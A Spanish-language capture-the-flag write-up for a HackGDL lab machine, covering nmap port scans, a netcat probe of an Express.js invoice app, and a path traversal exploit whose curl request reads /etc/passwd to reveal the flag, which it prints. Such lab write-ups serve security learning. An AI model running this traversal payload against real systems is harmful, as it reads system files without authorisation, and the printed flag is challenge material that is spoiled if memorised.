# xiuhtecuhtli — HackGDL CTF

**IP:** `10.0.1.7`  
**Dificultad:** Intermediate, Non rootable  
**Puntos:** 1,400  
**Flag:** `ETSCTF_629eb26565f903356574d3c763667e71`

---

## Pista

> "Those who control time, control the invoices... and some system files."

---

## Reconocimiento

### Escaneo TCP

```bash
nmap -p 1-65535 --min-rate 5000 10.0.1.7
```

- Todos los puertos comunes cerrados/filtrados
- **Puerto 1337/tcp abierto** (servicio desconocido)

### Escaneo UDP

```bash
nmap -sU --top-ports 100 10.0.1.7
```

- **Puerto 2049/udp filtrado** (NFS) — resultó ser un rabbit hole

---

## Servicio en puerto 1337

```bash
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 10.0.1.7 1337
```

Respuesta: aplicación web **Express.js** — **Invoice Generator**

```html
<form action="/api/v1/generate-invoice" method="GET">
    Client Name: <input type="text" name="client">
    Branding Location: <select name="branding">
        <option value="branding/logo1.jpg">logo1.jpg</option>
        <option value="branding/logo2.jpg">logo2.jpg</option>
    </select>
</form>
```

---

## Vulnerabilidad — Path Traversal (LFI)

El parámetro `branding` carga archivos del sistema sin sanitizar.

### Exploit

```bash
curl "http://10.0.1.7:1337/api/v1/generate-invoice?client=test&branding=../../../etc/passwd"
```

Esto devuelve el contenido de `/etc/passwd` embebido en la respuesta (PDF/stream).

### Flag encontrado en `/etc/passwd`

```
ETSCTF:x:1000:1000:ETSCTF_629eb26565f903356574d3c763667e71:/home/ETSCTF:/bin/bash
```

---

## Lecciones

- Puertos no estándar como 1337 pueden esconder servicios web
- El parámetro de "branding/logo" es un indicador clásico de path traversal
- En CTFs, el flag suele estar en `/etc/passwd` (campo GECOS), `/flag.txt`, o `/root/flag.txt`
- NFS en 2049 UDP sin portmapper = NFSv4, pero en este caso era un rabbit hole

---

## Comandos clave

```bash
# Descubrir puerto
nmap -p 1-65535 --min-rate 5000 10.0.1.7

# Ver la app web
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 10.0.1.7 1337

# Explotar LFI
curl "http://10.0.1.7:1337/api/v1/generate-invoice?client=test&branding=../../../etc/passwd"
```

---

## Tags

#CTF #HackGDL #LFI #PathTraversal #ExpressJS #WebApp